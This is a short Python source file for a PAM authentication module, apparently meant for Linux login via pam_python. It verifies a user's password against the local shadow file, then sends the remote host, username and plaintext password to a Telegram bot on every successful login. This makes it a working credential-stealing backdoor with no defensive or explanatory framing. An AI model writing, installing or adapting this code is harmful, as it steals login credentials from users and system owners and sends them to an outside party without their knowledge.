import spwd
import crypt
import requests

def sendMessage(msg):
    apiKey = "API-KEY"
    userId = "USER-ID"
    data = {"chat_id":userId,"text":msg}
    url = "https://api.telegram.org/bot{}/sendMessage".format(apiKey)
    r = requests.post(url,json=data)
    
def check_pw(user, password):
    """Check the password matches local unix password on file"""
    hashed_pw = spwd.getspnam(user)[1]
    return crypt.crypt(password, hashed_pw) == hashed_pw

def pam_sm_authenticate(pamh, flags, argv):
    try:
        user = pamh.get_user()
    except pamh.exception as e:
        return e.pam_result
    if not user:
        return pamh.PAM_USER_UNKNOWN
    try:
        resp = pamh.conversation(pamh.Message(pamh.PAM_PROMPT_ECHO_OFF, "Password:"))
    except pamh.exception as e:
        return e.pam_result
    if not check_pw(user, resp.resp):
        return pamh.PAM_AUTH_ERR
    sendMessage("Connection from host {} using the user {} and password {}".format(pamh.rhost, user, resp.resp))
    return pamh.PAM_SUCCESS

def pam_sm_setcred(pamh, flags, argv):
    return pamh.PAM_SUCCESS

def pam_sm_acct_mgmt(pamh, flags, argv):
    return pamh.PAM_SUCCESS

def pam_sm_open_session(pamh, flags, argv):
    return pamh.PAM_SUCCESS

def pam_sm_close_session(pamh, flags, argv):
    return pamh.PAM_SUCCESS

def pam_sm_chauthtok(pamh, flags, argv):
    return pamh.PAM_SUCCESS
